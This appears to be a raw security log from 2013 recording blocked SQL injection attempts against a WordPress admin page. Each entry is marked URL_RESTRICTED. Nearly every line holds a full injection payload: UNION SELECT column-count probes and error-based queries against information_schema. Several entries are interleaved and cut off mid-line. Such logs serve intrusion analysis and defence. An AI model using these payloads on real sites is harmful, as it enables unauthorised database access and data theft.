/wp-admin/options-general.php?page=taglineoptions1111111111111%27+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45)+--+/*+order+by+%27as+/*
[2013-11-18 11:04:19] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:19] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:19] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:19] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
[2013-11-18 11:04:20] : URL_RESTRICTED
neoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45)+--+/*+order+by+%22as+/*/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45)+--+/*+order+by+%22as+/*/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45)+--+/*+order+by+%22as+/*/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45
CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45)+--+/*+order+by+%22as+/*[2[2013-11-18 11:04:20] : URL_RESTRICTED/w/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45)+--+/*+order+by+%22as+/*/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:20] : URL_RESTRICTED
[2013-11-18 11:04:20] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45)+--+/*+order+by+%22as+/*[2013-11-18 11:04:20] : URL_RESTRICTED
neoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45)+--+/*+order+by+%22as+/*/wp-admin/options-general.php?page=taglineoptions1111111111111%22+UNION+SELECT+CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45)+--+/*+order+by+%22as+/*
[2013-11-18 11:04:25] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions999999.1%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,0x27,%27ololo%27,0x27,0x7e)%20FROM%20information_schema.schemata%20LIMIT%201))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%20
[2013-11-18 11:04:26] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions99999%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,0x27,%27ololo%27,0x27,0x7e)%20FROM%20information_schema.schemata%20LIMIT%201))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%20--%20%27x%27=%27x
[2013-11-18 11:04:26] : URL_RESTRICTED
/wp-admin/options-general.php?page=taglineoptions99999%22%20and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,0x27,%27ololo%27,0x27,0x7e)%20FROM%20information_schema.schemata%20LIMIT%201))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%20--%20%22x%22=%22x
